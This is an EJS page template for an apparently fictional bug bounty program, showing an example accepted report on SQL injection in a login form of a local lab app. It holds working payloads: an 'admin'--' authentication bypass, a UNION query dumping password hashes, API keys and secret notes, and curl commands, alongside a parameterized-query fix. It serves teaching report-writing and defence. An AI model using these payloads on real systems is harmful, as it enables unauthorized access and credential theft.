<%- include('../../partials/program-navbar') %>
<div class="prog-page">
  <div style="margin-bottom:20px;">
    <div style="font-size:12px;color:var(--prog-muted);margin-bottom:4px;"><a href="/program" style="color:#25855A;text-decoration:none;">Program</a> › <a href="/program/rules" style="color:#25855A;text-decoration:none;">Rules</a> › Example: Accepted</div>
    <h1 style="font-size:22px;font-weight:800;">Example: Accepted Report ✅</h1>
    <p style="color:var(--prog-muted);font-size:13px;">This is what a well-written, accepted bug report looks like.</p>
  </div>

  <div class="prog-card">
    <div class="prog-card-header" style="background:#F0FFF4;border-color:#C6F6D5;">
      <div>
        <h2 style="font-size:17px;font-weight:800;">SQL Injection in POST /login allows authentication bypass and full database access</h2>
        <div style="display:flex;gap:8px;margin-top:8px;">
          <span class="prog-badge prog-badge-red">Critical</span>
          <span class="prog-badge prog-badge-green">✅ Accepted</span>
          <span class="prog-badge prog-badge-gray">sqli</span>
          <span class="prog-badge prog-badge-gray">CVSS 9.8</span>
        </div>
      </div>
      <div style="text-align:right;"><div style="font-size:24px;font-weight:800;color:#25855A;">$2,500</div><div style="font-size:11px;color:var(--prog-muted);">Bounty awarded</div></div>
    </div>
    <div class="prog-card-body">
      <div style="font-size:12px;color:var(--prog-muted);margin-bottom:20px;">By <strong>0xCartSec</strong> · Submitted 2024-11-15 · Endpoint: <code>POST /login</code></div>

      <% [
        ['Summary', "The login form at POST /login is vulnerable to SQL injection via the username parameter. An attacker can bypass authentication and log in as any user, including admin, without knowing their password. The injection also allows UNION-based extraction of all data from the database including password hashes, API keys, and secret notes."],
        ['Steps to Reproduce', "1. Navigate to http://syntex.local/login\n2. Enter the following in the username field: admin'--\n3. Enter any value in the password field\n4. Click 'Sign In'\n5. Observe: you are authenticated as admin without valid credentials\n\nAlternative — UNION dump all users:\nusername: ' UNION SELECT 1,username,'email@x.com',password_hash,'admin','First','Last','IT','Dev','api_key_here',secret_note,'bio',null,true,null,NOW(),NOW(),NOW()--"],
        ['Impact', "This vulnerability allows:\n- Complete authentication bypass — log in as any user including admin\n- Full database exfiltration via UNION injection\n- Exposure of all user credentials (MD5 hashes), API keys, and secret notes\n- Admin panel access leading to RCE via the command execution endpoint\n\nAll 7 seeded user accounts are compromised. An attacker with this access can:\n1. Read all orders, tickets, and customer PII\n2. Access admin panel and execute OS commands\n3. Dump all credentials and crack MD5 hashes offline"],
        ['Proof of Concept', "# Authentication bypass:\ncurl -X POST http://syntex.local/login \\\n  -d \"username=admin'--&password=anything\" \\\n  -c cookies.txt\n\n# Verify: should redirect to /dashboard\ncurl http://syntex.local/dashboard -b cookies.txt\n\n# UNION dump — extract all usernames and password hashes:\n# username: ' UNION SELECT 1,username,email,password_hash,'user',first_name,last_name,department,job_title,api_key,secret_note,bio,null,true,null,NOW(),NOW(),NOW() FROM users--"],
        ['Suggested Fix', "Use parameterized queries for all database interactions:\n\n// VULNERABLE:\nconst query = `SELECT * FROM users WHERE username = '${username}'`;\n\n// FIXED:\nconst result = await db.query(\n  'SELECT * FROM users WHERE username = $1 AND password_hash = $2',\n  [username, hashedPassword]\n);\n\nAdditionally:\n- Upgrade password hashing from MD5 to bcrypt (cost factor 12+)\n- Implement account lockout after 5 failed attempts\n- Add proper rate limiting that doesn't trust X-Forwarded-For"],
      ].forEach(([h,b]) => { %>
      <div style="margin-bottom:22px;">
        <div style="font-size:11px;font-weight:700;color:var(--prog-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;"><%= h %></div>
        <div style="font-size:13px;line-height:1.8;white-space:pre-wrap;background:#F7FAFC;padding:14px;border-radius:6px;border:1px solid #EDF2F7;font-family:<%= h==='Proof of Concept'||h==='Suggested Fix'?'monospace':'inherit' %>;font-size:<%= h==='Proof of Concept'||h==='Suggested Fix'?'12px':'13px' %>;"><%= b %></div>
      </div>
      <% }) %>

      <div style="background:#F0FFF4;border:1px solid #C6F6D5;border-radius:6px;padding:16px;margin-top:8px;">
        <div style="font-weight:700;color:#22543D;font-size:14px;margin-bottom:8px;">Triage Response</div>
        <p style="font-size:13px;line-height:1.7;color:#276749;">Confirmed critical. Excellent PoC with UNION extraction demonstrated. Parameterized queries required across all DB interactions. Password hashing upgrade scheduled. Bounty of $2,500 awarded. Thank you for the thorough report.</p>
      </div>
    </div>
  </div>

  <div style="margin-top:20px;display:flex;gap:10px;">
    <a href="/program/examples/duplicate"      class="prog-btn prog-btn-outline">Next: Duplicate Example →</a>
    <a href="/program/submit"                   class="prog-btn prog-btn-green">Submit Your Report →</a>
  </div>
</div>
<%- include('../../partials/program-footer') %>
